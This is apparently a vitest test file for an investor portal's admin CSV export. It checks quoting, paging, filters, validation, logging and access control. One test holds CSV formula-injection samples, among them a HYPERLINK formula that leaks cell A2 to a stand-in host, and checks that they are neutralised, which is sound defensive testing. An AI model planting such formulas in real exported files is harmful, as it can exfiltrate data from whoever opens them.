/**
 * The investors list as CSV (W2-07) through the portal's own apiRouter,
 * over the test database: the cell escaping and the formula-injection
 * prefix (csv.js), the file's headers and columns, every page in the
 * list's order, the list's search, filters and sort, query validation and
 * the admin gate.
 */
import express from "express";
import request from "supertest";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { CHOICE_LABELS, CHOICE_LISTS, CSV_BOM, csvCell, csvDateTime, investorsCsvFileName, toCsv } from "../csv.js";
import { createInvestorsPortal } from "../index.js";
import { PAGE_SIZE } from "../queries/investor-list.js";
import { ADA, ADMIN, bearer, fakeAuthDeps } from "./helpers/fake-clerk.js";
import { insertDocument, insertEvents, insertInvestor, insertSessions, pageView, repeat } from "./helpers/investor-fixtures.js";
import { createTestDb } from "./helpers/test-db.js";

const ENV = Object.freeze({
  INVESTORS_DATABASE_URL: "postgres://portal:not-a-real-password@localhost:5432/test",
  CLERK_SECRET_KEY: "sk_test_fake-secret-value",
  CLERK_PUBLISHABLE_KEY: "pk_test_fake-publishable-value",
  INVESTOR_ADMIN_CLERK_IDS: ADMIN.id,
});

const HEADER = [
  "Name",
  "Email",
  "Firm",
  "Investor type",
  "Cheque size",
  "Source",
  "Signed up (UTC)",
  "Last seen (UTC)",
  "Sessions",
  "Total time (min)",
  "Documents opened",
  "Downloads",
  "Deck furthest page",
  "Deck page count",
  "Blocked",
  "Marketing opt-in",
];

/**
 * RFC 4180 records from the file: quoted cells may hold commas, quotes and
 * line breaks. Strict on purpose: every cell must be quoted.
 * @param {string} text
 * @returns {string[][]}
 */
function parseCsv(text) {
  expect(text.startsWith(CSV_BOM)).toBe(true);
  expect(text.endsWith("\r\n")).toBe(true);
  const cell = /"((?:[^"]|"")*)"(,|\r\n)/gy;
  const records = [];
  let record = [];
  let end = CSV_BOM.length;
  let match;
  cell.lastIndex = end;
  while ((match = cell.exec(text)) !== null) {
    end = cell.lastIndex;
    record = [...record, match[1].replaceAll('""', '"')];
    if (match[2] === "\r\n") {
      records.push(record);
      record = [];
    }
  }
  // Nothing left over: every byte belonged to a quoted cell.
  expect([end, record.length]).toEqual([text.length, 0]);
  return records;
}

/** @type {import("../db.js").Db} */
let db;
let app;
let logger;
beforeAll(async () => {
  db = await createTestDb();
});
afterAll(() => db.end());

beforeEach(async () => {
  logger = { warn: vi.fn(), error: vi.fn() };
  const portal = createInvestorsPortal({ env: ENV, deps: { logger, createDb: () => db, ...fakeAuthDeps() } });
  await portal.start();
  app = express().use("/api/investors", portal.apiRouter);
  await db.query("DELETE FROM investors.documents");
  await db.query("DELETE FROM investors.investors");
});

/** @param {Record<string, string>} [query] */
const exportCsv = (query = {}, who = ADMIN) =>
  request(app).get("/api/investors/admin/investors.csv").query(query).set("Authorization", bearer(who.id));

/** The data records without the admin's own row (the admin's request creates it). */
const fixtureRecords = (res) => parseCsv(res.text).slice(1).filter((record) => record[1] !== ADMIN.email);

const emails = (res) => fixtureRecords(res).map((record) => record[1]);

describe("csv.js", () => {
  it("quotes every cell and doubles the quotes inside", () => {
    expect(csvCell('Example "Quoted" Ventures, Ltd')).toBe('"Example ""Quoted"" Ventures, Ltd"');
    expect(csvCell("two\nlines")).toBe('"two\nlines"');
    expect(csvCell(12)).toBe('"12"');
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it.each(["=", "+", "-", "@", "\t", "\r"])("puts a single quote before a cell starting with %j", (start) => {
    expect(csvCell(`${start}1+1`)).toBe(`"'${start}1+1"`);
  });

  it("prefixes before quoting, and leaves other cells alone", () => {
    expect(csvCell('=HYPERLINK("https://example.com","x")')).toBe('"\'=HYPERLINK(""https://example.com"",""x"")"');
    expect(csvCell("Ada = Example")).toBe('"Ada = Example"');
    expect(csvCell(" =1+1")).toBe('" =1+1"');
    expect(csvCell("'quoted")).toBe('"\'quoted"');
  });

  it("writes a byte order mark, a header row and CRLF line ends", () => {
    const columns = [
      { header: "A", value: (row) => row.a },
      { header: "B", value: (row) => row.b },
    ];
    expect(toCsv(columns, [{ a: 1, b: "x,y" }])).toBe(`${CSV_BOM}"A","B"\r\n"1","x,y"\r\n`);
    expect(toCsv(columns, [])).toBe(`${CSV_BOM}"A","B"\r\n`);
  });

  it("labels every choice of the profile's lists", () => {
    for (const [list, values] of Object.entries(CHOICE_LISTS)) {
      expect(Object.keys(CHOICE_LABELS[list]).sort()).toEqual([...values].sort());
    }
  });

  it("writes times in UTC to the minute and names the file after the UTC day", () => {
    expect(csvDateTime(new Date("2026-10-27T23:59:59.999Z"))).toBe("2026-10-27 23:59");
    expect(csvDateTime(null)).toBe("");
    expect(investorsCsvFileName(new Date("2026-10-27T23:30:00Z"))).toBe("investors-2026-10-27.csv");
  });
});

describe("GET /admin/investors.csv: the file", () => {
  it("is a CSV attachment named after today, with the table's columns plus email and opt-in", async () => {
    const before = investorsCsvFileName(new Date());
    const res = await exportCsv();
    const after = investorsCsvFileName(new Date());
    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toBe("text/csv; charset=utf-8");
    expect([`attachment; filename="${before}"`, `attachment; filename="${after}"`]).toContain(
      res.headers["content-disposition"],
    );
    expect(res.headers["cache-control"]).toMatch(/no-store/);
    expect(parseCsv(res.text)[0]).toEqual(HEADER);
  });

  it("writes each investor's profile and aggregates as the table counts them", async () => {
    const deck = await insertDocument(db, { alertOnFirstOpen: true, pageCount: 12 });
    const ada = await insertInvestor(db, { email: "ada@example.com", chequeSize: "50k_250k", marketingOptIn: true });
    await insertSessions(db, ada, 2);
    await insertEvents(db, ada, [
      ...repeat("document_open", deck, 2),
      pageView(deck, 3, 200_000),
      { type: "section_view", durationMs: 1_000, data: { section: "team" } },
      ...repeat("document_download", deck, 2),
    ]);
    await insertInvestor(db, { name: null, firm: null, investorType: null, source: null, email: "quiet@example.com" });
    await db.query("UPDATE investors.investors SET blocked = true WHERE email = 'quiet@example.com'");

    const res = await exportCsv({ sort: "name", dir: "asc" });
    const [adaRecord, quietRecord] = fixtureRecords(res);
    expect(adaRecord).toEqual([
      "Ada Example",
      "ada@example.com",
      "Example Ventures",
      "Venture capital",
      "50k to 250k",
      "Web Summit",
      expect.stringMatching(/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/),
      expect.stringMatching(/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/),
      "2",
      "3.4",
      "1",
      "2",
      "3",
      "12",
      "no",
      "yes",
    ]);
    expect(quietRecord).toEqual([
      "",
      "quiet@example.com",
      "",
      "",
      "",
      "",
      expect.any(String),
      expect.any(String),
      "0",
      "0.0",
      "0",
      "0",
      "",
      "",
      "yes",
      "no",
    ]);
  });

  it("keeps names that a spreadsheet would run as formulas as text, and quotes and commas in their cell", async () => {
    const hostile = [
      '=HYPERLINK("https://example.com/?leak="&A2,"Open")',
      "+1 Example",
      "-Example",
      "@SUM(A1:A9)",
      "\tTab Example",
      "\rReturn Example",
    ];
    for (const [index, name] of hostile.entries()) {
      await insertInvestor(db, { name, firm: 'Example, "Quoted" Ventures', email: `hostile${index}@example.com` });
    }
    const res = await exportCsv({ q: "hostile" });
    const records = fixtureRecords(res);
    expect(records.map((record) => record[0]).sort()).toEqual(hostile.map((name) => `'${name}`).sort());
    expect(records.map((record) => record[2])).toEqual(hostile.map(() => 'Example, "Quoted" Ventures'));
    expect(res.text).toContain('"\'=HYPERLINK(""https://example.com/?leak=""&A2,""Open"")"');
  });
});

describe("GET /admin/investors.csv: every page, the list's filter and sort", () => {
  it("writes every investor, past the list's page size, in the list's order", async () => {
    const count = PAGE_SIZE + 3;
    for (let i = 0; i < count; i += 1) {
      await insertInvestor(db, { name: `Example ${String(i).padStart(3, "0")}`, email: `bulk${i}@example.com` });
    }
    const res = await exportCsv({ sort: "name", dir: "desc", page: "2" });
    expect(res.status).toBe(200);
    const expected = Array.from({ length: count }, (_, i) => `bulk${i}@example.com`).reverse();
    expect(emails(res)).toEqual(expected);
  });

  it("honours the search, the type and source filters, and the sort", async () => {
    await insertInvestor(db, { name: "Grace Sample", investorType: "angel", source: "intro", email: "a@example.com" });
    await insertInvestor(db, { name: "Ben Grace", investorType: "vc", source: "intro", email: "b@example.com" });
    await insertInvestor(db, { name: "Cy Grace", investorType: "angel", source: "website", email: "c@example.com" });
    await insertInvestor(db, { name: "Dee Example", investorType: "angel", source: "intro", email: "d@example.com" });

    expect(emails(await exportCsv({ q: "grace", sort: "name", dir: "asc" }))).toEqual([
      "b@example.com",
      "c@example.com",
      "a@example.com",
    ]);
    expect(emails(await exportCsv({ type: "angel", sort: "name", dir: "asc" }))).toEqual([
      "c@example.com",
      "d@example.com",
      "a@example.com",
    ]);
    expect(emails(await exportCsv({ q: "grace", type: "angel", source: "intro" }))).toEqual(["a@example.com"]);
    expect(emails(await exportCsv({ q: "nobody" }))).toEqual([]);
  });

  it("matches the list's rows for the same query", async () => {
    for (const name of ["Ada Example", "ben Sample", "Cy Placeholder"]) {
      await insertInvestor(db, { name, email: `${name.split(" ")[0].toLowerCase()}@example.com` });
    }
    const query = { sort: "name", dir: "desc" };
    const listed = await request(app)
      .get("/api/investors/admin/investors")
      .query(query)
      .set("Authorization", bearer(ADMIN.id));
    const listedEmails = listed.body.investors.map((row) => row.email).filter((email) => email !== ADMIN.email);
    expect(emails(await exportCsv(query))).toEqual(listedEmails);
  });
});

describe("GET /admin/investors.csv: validation, audit and the gate", () => {
  it("refuses a bad sort, type, source or search as the list does", async () => {
    const tooLong = "x".repeat(201);
    for (const [query, field, code] of [
      [{ sort: "email" }, "sort", "invalid_option"],
      [{ dir: "up" }, "dir", "invalid_option"],
      [{ type: "bank" }, "type", "invalid_option"],
      [{ source: "radio" }, "source", "invalid_option"],
      [{ q: tooLong }, "q", "too_long"],
    ]) {
      const res = await exportCsv(query);
      expect(res.status).toBe(400);
      expect(res.body).toEqual({ error: "invalid", fields: { [field]: code } });
    }
  });

  it("logs who exported how many rows, never their contents", async () => {
    await insertInvestor(db, { email: "ada@example.com" });
    await exportCsv();
    const lines = logger.warn.mock.calls.map(([line]) => line).filter((line) => line.includes("CSV"));
    expect(lines).toEqual([expect.stringMatching(/^\[investors\] admin [0-9a-f-]{36} exported 2 investors as CSV$/)]);
    expect(lines.join("\n")).not.toContain("example.com");
  });

  it("is refused without a token and to an investor who is not an admin", async () => {
    const anonymous = await request(app).get("/api/investors/admin/investors.csv");
    expect(anonymous.status).toBe(401);
    const investor = await exportCsv({}, ADA);
    expect(investor.status).toBe(403);
    expect(investor.body).toEqual({ error: "forbidden" });
    expect(investor.headers["content-disposition"]).toBeUndefined();
  });
});
